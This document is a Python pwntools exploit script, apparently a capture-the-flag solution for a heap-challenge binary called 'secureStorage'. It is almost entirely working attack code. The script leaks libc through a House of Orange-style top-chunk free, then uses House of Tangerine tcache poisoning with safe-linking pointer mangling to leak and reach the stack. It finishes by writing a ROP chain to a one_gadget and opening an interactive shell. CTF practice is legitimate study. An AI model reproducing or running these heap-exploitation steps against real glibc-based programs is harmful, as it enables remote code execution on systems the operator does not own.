from pwn import *

context.log_level='info'
context.arch = 'amd64'
context.bits = 64
context.terminal = ['tmux', 'splitw', '-h']

libc_path = './libc.so.6'
libc = ELF(libc_path)

#p = remote("10.10.194.37",1337)
p = process(["nc","IP_ADDRESS","1337"]) 
#p = gdb.debug("./secureStorage") 

def malloc(idx, size, data,line=True):
    p.recvuntil(b">>",timeout = 0.5)
    p.sendline(b"1")
    p.sendlineafter(b"index:", str(idx).encode())
    p.sendlineafter(b"size:", str(size).encode())
    if line:
        p.sendlineafter(b"data:", data)
    else:
        p.sendafter(b"data:", data)

def read(idx):
    p.sendlineafter(b">>", b"2",timeout=0.5)
    p.sendlineafter(b"index:", str(idx).encode())
    data = p.recvuntil(b"Permit Entry")
    return data

def edit(idx, data):
    p.sendlineafter(b">>", b"3",timeout=0.5)
    p.sendlineafter(b"index:", str(idx).encode())
    p.sendafter(b"data:", data)

def exit():
    p.sendafter(b">>", b"4")

# LEAKING LIBC (by using start of House of Orange) ------------------
# free top to unsorted                                              #
malloc(1,0x3f0,b'a'*0x3f8+p64(0x971)) # overwrite top size
malloc(2,0xfa8,b'') # free top

# leak libc pointer
edit(1,b'b'*0x400) # fill chunk before free'd top with 'b's (also overwrites size of next chunk with 'b's)
a = read(1) # a = b"\nbbbbbb....bbb\x20\xbb\x96\x49\x7f\x7f"

libc_leak = u64(a[0x401:0x401+6] + b'\0\0')
print("LIBC leak:",hex(libc_leak))

libc.address = libc_leak - 0x203b20
print("LIBC base:", hex(libc.address))

# clean the heap
edit(1,b"a"*0x3f8+p64(0x951)) # reset size of free top
malloc(4,0x940,b'') # malloc top                                    #
# -------------------------------------------------------------------


# ARBITRARY READ/WRITE to go to libc (by using House of Tangerine)---
# free two chunks                                                   #
malloc(5,0x10,b'')
malloc(31,0x7c0,b'')
malloc(6,0x518,b'A'*(0x518)+p64(0x61+0x2e0)) # overwrite top1 size
malloc(30,0x7c0,b'') # free top1
malloc(7,0x4e8,b'D'*0x4e8+p64(0x61+0x2e0)) # overwrite top2 size
malloc(8,0xf98,b'') # free top2

# leak value for mangling heap next pointers
edit(6,b'D'*(0x520))
a = read(6)

mangle = u64(a[0x521:0x521+5]+b'\x00\x00\x00')+33
print('Value to mangle next pointer:',hex(mangle))

edit(6,b'D'*(0x518)+p64(0x61)) # reset size

# overwrite next pointer of second free'd chunk'
target = libc.address + 0x2046e0 - 0x10
edit(7,b'D'*0x4e8+p64(0x61+0x2e0)+p64(target ^ mangle))

malloc(9,0x310,b'A'*0x30)
malloc(10,0x310,b'a'*0x10,False) # malloc to libc

# leak stack
a = read(10)
stack_target = u64(a[0x10+1:0x10+7] + b'\0\0') - 0x228
print("STACK target:",hex(stack_target))                            #
# -------------------------------------------------------------------


# GOING TO THE STACK ------------------------------------------------
# house of tangerine again                                          #
malloc(26,0x7d0,b'')
malloc(11,0x458,b'A'*0x458+p64(0x421))
malloc(24,0x5d0,b'') # free top
malloc(12,0x5f8,b'A'*(0x5f8)+p64(0x421))
malloc(13,0xf98,b'') # free another top

edit(12,b'D'*0x5f8+p64(0x421)+p64(stack_target ^ (mangle+0x44))) # overwrite next pointer

malloc(14,0x3f8,b'') 
malloc(15,0x3f8,b'') # malloc stack                                 #
# -------------------------------------------------------------------


# ROP ---------------------------------------------------------------
# create rop chain                                                  #
libc_rop = ROP(libc)
ret = (libc_rop.find_gadget(['ret']))[0]
pop_r12 = libc_rop.find_gadget(["pop r12","ret"])[0]
pop_rbx = libc_rop.find_gadget(["pop rbx","ret"])[0]

chain = p64(ret)*0x50+p64(pop_r12)+p64(0)+p64(pop_rbx)+p64(0)+p64(libc.address+0xef4ce) # 0xef4ce is a one_gadget

# write ROP chain to stack
edit(15,chain)

p.interactive() # free shell use                                    #
# -------------------------------------------------------------------

